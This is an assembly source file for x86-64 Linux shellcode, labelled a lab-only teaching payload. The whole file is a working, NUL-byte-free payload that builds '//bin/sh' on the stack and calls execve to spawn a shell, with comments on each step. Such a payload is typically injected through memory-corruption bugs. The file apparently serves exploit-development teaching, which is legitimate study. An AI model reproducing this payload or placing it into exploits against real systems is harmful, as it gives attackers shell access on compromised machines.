/* execve_x64.S  — assemble: gcc -nostdlib -static -o x64 execve_x64.S
 * Lab-only teaching payload. See ../../ETHICS.md. */
.intel_syntax noprefix
.global _start
.text
_start:
    xor    rsi, rsi                 /* ❶ rsi = 0  -> argv = NULL */
    mul    rsi                      /* ❷ rdx:rax = rax*rsi = 0, so rdx = 0 (envp) */
    push   rsi                      /* ❸ push a NUL terminator for the string */
    mov    rdi, 0x68732f6e69622f2f  /* ❹ "//bin/sh" little-endian, no NUL byte */
    push   rdi                      /* ❺ string now lives on the stack */
    push   rsp
    pop    rdi                      /* ❻ rdi -> "//bin/sh" */
    mov    al, 0x3b                  /* ❼ rax = 59 = __NR_execve, one byte */
    syscall                          /* ❽ never returns on success */
